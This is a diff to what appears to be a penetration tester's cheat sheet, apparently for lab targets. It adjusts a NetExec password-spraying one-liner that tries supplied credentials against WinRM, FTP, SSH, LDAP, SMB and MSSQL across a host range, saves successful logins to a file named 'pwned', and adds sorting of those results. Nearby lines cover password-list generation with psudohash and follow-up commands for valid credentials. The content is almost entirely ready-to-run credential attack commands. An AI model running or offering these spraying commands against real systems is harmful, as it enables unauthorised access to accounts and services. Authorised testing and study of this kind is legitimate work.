@@ -148,10 +148,11 @@ psudohash.py -w phantom -y 2023-2025 -cpb -cpa -cpo -ap '~,`,!,@,#,$,%,^,&,*,(,)
 ## Sorting Lists
 cat usernames | sort -u | tee usernames
 cat passwords | sort -u | tee passwords
+cat pwned | sort -u | sort -k5,5
 
 ## Spray Services
 SPRAYU=$USERNAME;SPRAYP=$PASSWORD;SPRAYHOSTS='192.168.210.10-20';
-for p in winrm ftp ssh ldap smb mssql;do (nxc "$p" "$SPRAYHOSTS" -u "$SPRAYU" -p "$SPRAYP" --continue-on-success -t 20 --no-progress --timeout 8 --dns-timeout 8 | grep -a --line-buffered -oP '\d{1,3}(?:\.\d{1,3}){3}\s+\d+\s+\S+\s.*$DOM\\\S.*' | sed -E '/\[\+\]|CHANGE/ { s/($DOM\\)([^:]+:[^ ].*)/\1\x1b[1;33m\2\x1b[0m/; /\x1b\[1;33m/!d }' | grep --color=always -P '\x1b\[1;33m.*\x1b\[0m' | tee -a ./pwned &); done;wait
+for p in winrm ftp ssh ldap smb mssql;do (nxc "$p" "$SPRAYHOSTS" -u "$SPRAYU" -p "$SPRAYP" --continue-on-success -t 20 --no-progress --timeout 8 --dns-timeout 8 | grep -a --line-buffered -oP '\d{1,3}(?:\.\d{1,3}){3}\s+\d+\s+\S+\s.*$DOM\\\S.*' | sed -E '/\[\+\]|CHANGE/ { s/($DOM\\)([^:]+:[^ ].*)/\1\x1b[1;33m\2\x1b[0m/; /\x1b\[1;33m/!d }' | grep --color=always -P '\x1b\[1;33m.*\x1b\[0m' | tee -a ./pwned &); done;wait; cat pwned | sort -u | sort -k5,5
 
 ## Web
 curl -sI $TARGET | grep -oP '(?<=https?://)[^/\s]+'
@@ -198,7 +199,7 @@ unzip backup.zip -d .
 
 ## Spray Services
 SPRAYU=$USERNAME;SPRAYP=$PASSWORD;SPRAYHOSTS='192.168.210.10-20';
-for p in winrm ftp ssh ldap smb mssql;do (nxc "$p" "$SPRAYHOSTS" -u "$SPRAYU" -p "$SPRAYP" --continue-on-success -t 20 --no-progress --timeout 8 --dns-timeout 8 | grep -a --line-buffered -oP '\d{1,3}(?:\.\d{1,3}){3}\s+\d+\s+\S+\s.*$DOM\\\S.*' | sed -E '/\[\+\]|CHANGE/ { s/($DOM\\)([^:]+:[^ ].*)/\1\x1b[1;33m\2\x1b[0m/; /\x1b\[1;33m/!d }' | grep --color=always -P '\x1b\[1;33m.*\x1b\[0m' | tee -a ./pwned &); done;wait
+for p in winrm ftp ssh ldap smb mssql;do (nxc "$p" "$SPRAYHOSTS" -u "$SPRAYU" -p "$SPRAYP" --continue-on-success -t 20 --no-progress --timeout 8 --dns-timeout 8 | grep -a --line-buffered -oP '\d{1,3}(?:\.\d{1,3}){3}\s+\d+\s+\S+\s.*$DOM\\\S.*' | sed -E '/\[\+\]|CHANGE/ { s/($DOM\\)([^:]+:[^ ].*)/\1\x1b[1;33m\2\x1b[0m/; /\x1b\[1;33m/!d }' | grep --color=always -P '\x1b\[1;33m.*\x1b\[0m' | tee -a ./pwned &); done;wait; cat pwned | sort -u | sort -k5,5
 
 ## Valid Creds
 sudo skewme $TARGET
